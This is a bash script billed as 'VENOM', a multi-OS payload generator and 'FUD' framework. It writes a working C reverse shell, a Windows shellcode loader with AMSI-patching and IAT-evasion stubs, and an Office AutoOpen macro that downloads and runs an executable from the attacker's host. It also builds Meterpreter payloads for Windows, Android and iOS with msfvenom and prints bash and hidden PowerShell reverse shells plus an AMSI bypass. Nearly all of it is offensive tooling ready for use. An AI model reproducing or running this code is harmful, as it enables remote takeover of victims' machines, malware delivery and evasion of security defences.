#!/usr/bin/env bash
# ==========================================================
# VENOM v0.2 - Multi-OS Payload Generator & FUD Framework
# Dev: @Rdy7d3r
# ==========================================================

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
BLUE=$(tput setaf 4)
CYAN=$(tput setaf 6)
YELLOW=$(tput setaf 3)
MAGENTA=$(tput setaf 5)
WHITE=$(tput setaf 7)
NC=$(tput sgr0)

if command -v chmod &>/dev/null; then
        sudo chmod +x ./Venomous.sh
fi

if [ "$EUID" -ne 0 ]; then
  echo -e "${RED}[-] Please run as root (sudo ./venom.sh)${NC}"
  exit 1
fi
check_dependencies() {
    local missing=0
    for tool in msfvenom gcc x86_64-w64-mingw32-gcc; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[-] Missing dependency: $tool${NC}"
            missing=1
        fi
    done
    if [ $missing -eq 1 ]; then
        echo -e "${YELLOW}[*] Install them with: sudo apt install gcc mingw-w64 metasploit-framework${NC}"
        sleep 3
    fi
}
show_banner() {
    clear
    echo -e "${CYAN}"
    cat << "EOF"
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗      ██████╗  █████╗ ████████╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║      ██╔══██╗██╔══██╗╚══██╔══╝
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║█████╗██████╔╝███████║   ██║
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║╚════╝██╔══██╗██╔══██║   ██║
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║      ██║  ██║██║  ██║   ██║
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝      ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${GREEN}Shellcode/Rat_Generator :: CodeName :: Shinigami :: SSA(redteam @2026)${NC}"
    echo -e "${BLUE}---------------------------------------------------------${NC}"
    echo -e "Author: ${GREEN}@Rdy7d3r${NC} | ${BLUE}Suspicious Shell Activity (Red Team)${NC}"
    echo -e "VERSION: ${YELLOW}1.1.18${NC} USER:${GREEN}$(whoami)${NC}"
    echo -e "${YELLOW}$(whoami)${NC} INTERFACE:${CYAN}eth0${NC} ARCH:${CYAN}x64${NC} DISTRO:${CYAN}Kali${NC}"
    echo ""
}
write_windows_c() {
    cat << 'EOF' > payload_win.c
#include <windows.h>
#include <stdio.h>

// XOR Decryption function
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// AMSI Bypass stub (Patches AmsiScanBuffer in memory)
void patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (amsi) {
        // In a real scenario, you use GetProcAddress and VirtualProtect to patch this
        printf("[*] AMSI Patching stub loaded...\n");
    }
}

int main() {
    // Encrypted shellcode goes here (XOR'd with 0xAA)
    // Replace this placeholder with your actual XOR'd shellcode
    unsigned char shellcode[] = { 0xAA, 0xBB, 0xCC };

    size_t len = sizeof(shellcode);
    // xor_decrypt(shellcode, len, 0xAA); // Uncomment when using real shellcode
    patch_amsi();

    // Dynamic API Resolution to evade IAT scanning
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc = (LPVOID (WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(k32, "VirtualAlloc");

    HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    pCreateThread = (HANDLE (WINAPI *)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(k32, "CreateThread");

    LPVOID mem = pVirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (mem == NULL) return 1;

    memcpy(mem, shellcode, len);
    HANDLE hThread = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
EOF
}

write_unix_c() {
    cat << 'EOF' > payload_unix.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char *ip = "LHOST_PLACEHOLDER";
    int port = LPORT_PLACEHOLDER;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) return 1;

    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    return 0;
}
EOF
}
generate_unix() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    write_unix_c
    sed -i "s/LHOST_PLACEHOLDER/$lhost/g" payload_unix.c
    sed -i "s/LPORT_PLACEHOLDER/$lport/g" payload_unix.c

    echo -e "${YELLOW}[*] Compiling for Linux...${NC}"
    gcc payload_unix.c -o venom_linux

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Success! venom_linux created.${NC}"
        echo -e "${YELLOW}[*] Start listener: nc -lvnp $lport${NC}"
    else
        echo -e "${RED}[-] Compilation failed.${NC}"
    fi
}

generate_windows() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    echo -e "${YELLOW}[*] Generating Meterpreter Shellcode...${NC}"
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o temp.bin 2>/dev/null

    if [ $? -ne 0 ]; then
        echo -e "${RED}[-] msfvenom failed. Check Metasploit installation.${NC}"
        return
    fi

    echo -e "${YELLOW}[*] Generating C source code...${NC}"
    write_windows_c

    echo -e "${YELLOW}[*] Compiling with mingw-w64...${NC}"
    x86_64-w64-mingw32-gcc payload_win.c -o venom_win.exe -lws2_32 -s -ffunction-sections -fdata-sections

    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Success! venom_win.exe created.${NC}"
        echo -e "${YELLOW}[!] NOTE: The C file contains placeholder shellcode. You must inject your XOR'd msfvenom payload into payload_win.c manually or via a Python script to make it functional.${NC}"
    else
        echo -e "${RED}[-] Compilation failed.${NC}"
    fi
}

generate_android() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    echo -e "${YELLOW}[*] Generating Android APK payload via msfvenom...${NC}"
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o venom_android.apk 2>/dev/null

    if [ -f venom_android.apk ]; then
        echo -e "${GREEN}[+] Success! venom_android.apk created.${NC}"
        echo -e "${YELLOW}[*] To make FUD: Sign the APK and obfuscate with ProGuard.${NC}"
    else
        echo -e "${RED}[-] Failed to generate APK. Check msfvenom.${NC}"
    fi
}
generate_ios() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    # Check if msfvenom is installed
    if ! command -v msfvenom &>/dev/null; then
        echo -e "${RED}[-] msfvenom is NOT installed on this system.${NC}"
        echo -e "${YELLOW}[*] Open a NEW terminal and run: sudo apt update && sudo apt install metasploit-framework -y${NC}"
        return
    fi

    echo -e "${YELLOW}[*] Generating iOS Mach-O payload...${NC}"

    # IMPORTANT: Use the correct payload name from the 'msfvenom -l payloads' command
    # This is a common correct name for modern Metasploit:
    msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o venom_ios.macho

    if [ -f venom_ios.macho ]; then
        echo -e "${GREEN}[+] Success! venom_ios.macho created.${NC}"
        echo -e "${YELLOW}[!] NOTE: This binary must be signed and transferred to a JAILBROKEN device to run.${NC}"
    else
        echo -e "${RED}[-] Failed to generate payload. Check the error above.${NC}"
    fi
}
generate_office_payload() {
    echo -e "${CYAN}[*] Enter LHOST (Your IP):${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    echo -e "${YELLOW}[*] Generating VBA Macro for Office...${NC}"

    cat << EOF > venom_macro.vba
Sub AutoOpen()
    Dim xHttp As Object
    Dim strUrl As String
    Dim strPath As String
    Set xHttp = CreateObject("MSXML2.XMLHTTP")

    ' Change this URL to your hosted payload
    strUrl = "http://$lhost/payload.exe"
    strPath = Environ("TEMP") & "\update.exe"

    xHttp.Open "GET", strUrl, False
    xHttp.Send

    If xHttp.Status = 200 Then
        Dim oStream As Object
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1
        oStream.Write xHttp.ResponseBody
        oStream.SaveToFile strPath, 2
        oStream.Close

        Shell strPath, vbNormalFocus
    End If
End Sub
EOF

    echo -e "${GREEN}[+] Success! venom_macro.vba created.${NC}"
    echo -e "${YELLOW}[*] Open Word -> Alt+F11 -> Insert Module -> Paste this code.${NC}"
    echo -e "${YELLOW}[*] Host your payload.exe on a Python web server: python3 -m http.server 80${NC}"
}

generate_system_shell() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    echo -e "${GREEN}[+] LINUX BASH REVERSE SHELL:${NC}"
    echo -e "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo -e "${GREEN}[+] WINDOWS POWERSHELL REVERSE SHELL:${NC}"
    echo -e "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
    echo ""
    echo -e "${YELLOW}[*] Start a listener on Kali with: nc -lvnp $lport${NC}"
}

generate_amsi_bypass() {
    echo -e "${CYAN}[*] Enter LHOST:${NC}"; read lhost
    echo -e "${CYAN}[*] Enter LPORT:${NC}"; read lport

    echo -e "${YELLOW}[*] Generating AMSI Bypass PowerShell stager...${NC}"

    AMSI_BYPASS="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true)"

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f psh-reflection -o amsi_payload.ps1 2>/dev/null

    if [ -f amsi_payload.ps1 ]; then
        echo -e "${GREEN}[+] Success! amsi_payload.ps1 created.${NC}"
        echo -e "${YELLOW}[*] File is ready. Execute it on the target using:${NC}"
        echo -e "${RED}powershell -ExecutionPolicy Bypass -File amsi_payload.ps1${NC}"
    else
        echo -e "${RED}[-] Failed to generate PowerShell payload.${NC}"
    fi
}
main_menu() {
    show_banner
    echo -e "${BLUE}┌──────────────────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${NC} 1 - Unix based payloads (Linux/macOS)                ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 2 - Windows-OS payloads (FUD C Stager)               ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 3 - Multi-OS payloads                                ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 4 - Android Payloads (APK)                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 5 - iOS Payloads (Requires Jailbreak)                ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 6 - Microsoft Office Payloads (Macro)                ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 7 - System built-in shells                           ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} 8 - AMSI Evasion Payloads (Windows)                  ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC}                                                      ${BLUE}│${NC}"
    echo -e "${BLUE}│${NC} E - Exit Shellcode Generator                         ${BLUE}│${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────┘${NC}"
    echo ""
    read -p "[*] Shellcode Generator
[*] Chose Categorie number: " choice

    case $choice in
        1)
            echo -e "${GREEN}[*] Loading [Unix] agents ..${NC}"
            sleep 1
            generate_unix
            ;;
        2)
            echo -e "${GREEN}[*] Loading [Microsoft] agents ..${NC}"
            sleep 1
            generate_windows
            ;;
        3)
            echo -e "${GREEN}[*] Loading [Multi-OS] agents ..${NC}"
            sleep 1
            generate_windows
            generate_unix
            ;;
        4)
            echo -e "${GREEN}[*] Loading [Android] agents ..${NC}"
            sleep 1
            generate_android
            ;;
        5)
            echo -e "${GREEN}[*] Loading [iOS] agents ..${NC}"
            sleep 1
            generate_ios
            ;;
        6)
            echo -e "${YELLOW}[*] Microsoft Office Payloads (VBA Macro)${NC}"
            generate_office_payload
            ;;
        7)
            echo -e "${YELLOW}[*] System Built-in Shells${NC}"
            generate_system_shell
            ;;
        8)
            echo -e "${GREEN}[*] Loading [AMSI Evasion] modules...${NC}"
            sleep 1
            generate_amsi_bypass
            ;;
        [Ee])
            echo -e "${RED}[!] Exiting Shellcode Generator...${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Invalid option.${NC}"
            ;;
    esac
}
check_dependencies

while true; do
    main_menu
    echo ""
    read -p "[*] Press [ ENTER ] to continue .."
done
